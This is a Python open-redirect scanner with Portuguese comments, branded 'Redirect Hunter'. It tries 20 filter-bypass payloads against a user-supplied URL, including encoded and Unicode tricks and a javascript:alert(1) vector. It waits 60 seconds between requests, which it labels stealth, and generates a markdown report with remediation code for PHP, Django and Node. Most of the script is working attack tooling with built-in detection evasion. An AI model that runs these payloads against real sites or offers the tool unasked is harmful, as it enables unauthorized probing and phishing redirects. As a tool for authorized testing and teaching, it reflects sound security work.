import requests
import time
import os
from datetime import datetime

def gerar_relatorio_redirect(alvo, payload):
    """Gera um arquivo .md formatado para Open Redirect com remediação técnica."""
    data_atual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not os.path.exists("reports"):
        os.makedirs("reports")
        
    nome_arquivo = f"reports/Report_Redirect_{int(time.time())}.md"
    
    # Remediações por linguagem
    remediacoes = {
        "PHP": "```php\n// Use uma whitelist de domínios permitidos\n$allowed = ['seusite.com', 'api.seusite.com'];\nif (in_array($target, $allowed)) {\n    header('Location: ' . $target);\n}\n```",
        "Python_Django": "```python\n# Use a função url_has_allowed_host_and_scheme\nfrom django.utils.http import url_has_allowed_host_and_scheme\nif url_has_allowed_host_and_scheme(url=next_url, allowed_hosts={'seusite.com'}):\n    return redirect(next_url)\n```",
        "JavaScript_Node": "```javascript\n// Valide se a URL começa com '/' (redirecionamento local)\nif (userInput.startsWith('/')) {\n    res.redirect(userInput);\n}\n```"
    }

    conteudo = f"""# Relatório de Vulnerabilidade: Open Redirect

## 🛡️ Resumo
A aplicação permite que um usuário controle o destino de um redirecionamento através de parâmetros de URL não validados. Isso pode ser explorado por atacantes para conduzir vítimas a sites de phishing, mantendo a aparência de que estão em um domínio confiável.

**Alvo:** {alvo}
**Data do Teste:** {data_atual}
**Payload Utilizado:** `{payload}`
**Impacto:** Facilita ataques de engenharia social e phishing. O usuário confia na URL inicial (do site legítimo), mas acaba em um servidor controlado pelo atacante.

## 🛠️ Remediação Técnica
A melhor prática é evitar redirecionamentos baseados em input do usuário. Caso seja necessário:
1. **Whitelist:** Mantenha uma lista de URLs/domínios permitidos.
2. **Redirecionamento Relativo:** Permita apenas caminhos que comecem com `/`, impedindo domínios externos.

### Exemplos de Implementação:

#### PHP
{remediacoes['PHP']}

#### Python (Django)
{remediacoes['Python_Django']}

#### Node.js
{remediacoes['JavaScript_Node']}

---
*Gerado automaticamente por Open Redirect Hunter - Willian de Oliveira.*
"""
    with open(nome_arquivo, "w", encoding="utf-8") as f:
        f.write(conteudo)
    
    print(f"\n[+] Relatório de Open Redirect gerado: {nome_arquivo}")
    return nome_arquivo

def redirect_scanner_furtivo():
    print("""
============================================================
       REDIRECT HUNTER - Cibersegurança Essencial
       Desenvolvido por Willian de Oliveira 
       Certificado em Ciberseguranca pela IBSEC
============================================================
    """)
    
    target = input("🎯 URL Alvo (ex: http://site.com/login?redirect=): ")
    
    # 20 PAYLOADS DE ALTA PERFORMANCE (Bypass de filtros comuns)
    payloads = [
        "https://google.com",
        "//google.com",
        "////google.com",
        "https:google.com",
        "\\/\\/google.com",
        "https://google.com/%2f..",
        "//%2f%2fgoogle.com",
        "http://google.com#@yoursite.com",
        "https://yoursite.com.google.com",
        "/%09/google.com",
        "/%5cgoogle.com",
        "javascript:alert(1)", # Alguns redirecionamentos aceitam JS
        "/%2f%2fgoogle.com",
        "〱google.com",
        "//google%E3%80%82com",
        "https://google.com?",
        "https://google.com/",
        "/%2e%2e%2fgoogle.com",
        "http://%31%32%37%2e%30%2e%30%2e%31", # Bypass por IP em Hex
        "//google.com/%2f.."
    ]

    for i, p in enumerate(payloads):
        print(f"[*] [{i+1}/20] Testando: {p}")
        try:
            # Não seguimos o redirecionamento automaticamente para verificar o Header
            res = requests.get(target + p, timeout=10, allow_redirects=False)
            
            # Detecção: Se o status for 301, 302, 303, 307 ou 308 e o Header Location contiver o payload
            if res.status_code in [301, 302, 303, 307, 308]:
                location = res.headers.get('Location', '')
                if p in location or "google.com" in location:
                    print(f"💰 SUCESSO! Redirecionamento aberto detectado.")
                    gerar_relatorio_redirect(target, p)
                    break
        except:
            print("⚠️ Erro de conexão.")

        if i < len(payloads) - 1:
            print("⏳ Aguardando 60 segundos (Furtividade)...")
            time.sleep(60)

if __name__ == "__main__":
    redirect_scanner_furtivo()
